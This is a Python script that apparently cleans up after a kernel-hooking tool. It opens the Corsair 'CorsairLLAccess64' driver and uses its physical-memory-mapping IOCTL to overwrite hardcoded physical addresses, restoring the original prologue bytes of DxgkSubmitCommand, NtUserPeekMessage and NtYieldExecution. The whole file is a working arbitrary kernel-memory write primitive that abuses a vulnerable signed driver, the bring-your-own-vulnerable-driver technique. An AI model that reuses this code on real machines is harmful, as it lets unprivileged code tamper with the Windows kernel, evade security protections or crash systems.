import ctypes
import struct

# Targets
DXGK_HOOK_PA = 0x11EBB2190
PEEK_HOOK_PA = 0x228B6F470
YIELD_HOOK_PA = 0x10071B9D0

# Original Preambles (15 bytes each)
DXGK_ORIGINAL = bytes([
    0x48, 0x89, 0x5C, 0x24, 0x08, # mov [rsp+8], rbx
    0x48, 0x89, 0x74, 0x24, 0x10, # mov [rsp+10], rsi
    0x57,                         # push rdi
    0x48, 0x83, 0xEC, 0x50        # sub rsp, 50h
])

PEEK_ORIGINAL = bytes([
    0x48, 0x89, 0x5C, 0x24, 0x08, # mov [rsp+8], rbx
    0x48, 0x89, 0x74, 0x24, 0x10, # mov [rsp+10], rsi
    0x48, 0x89, 0x7C, 0x24, 0x18  # mov [rsp+18], rdi
])

YIELD_ORIGINAL = bytes([
    0x48, 0x83, 0xEC, 0x28,       # sub rsp, 28h
    0x33, 0xC9,                   # xor ecx, ecx
    0xE8, 0x15, 0x00, 0x00, 0x00, # call nt!KeYieldExecution
    0x48, 0x83, 0xC4, 0x28        # add rsp, 28h
])

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa &= ~0xFFF
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def write_phys(h, pa, data):
    v = map_page(h, pa & ~0xFFF)
    if not v: return False
    offset = pa & 0xFFF
    dst = (ctypes.c_ubyte * len(data)).from_address(v + offset)
    for i in range(len(data)):
        dst[i] = data[i]
    return True

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    print(f"[*] Restoring DxgkSubmitCommand...")
    write_phys(h, DXGK_HOOK_PA, DXGK_ORIGINAL)
    
    print(f"[*] Restoring NtUserPeekMessage...")
    write_phys(h, PEEK_HOOK_PA, PEEK_ORIGINAL)

    print(f"[*] Restoring NtYieldExecution...")
    write_phys(h, YIELD_HOOK_PA, YIELD_ORIGINAL)
    
    print("[+] Cleanup complete.")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
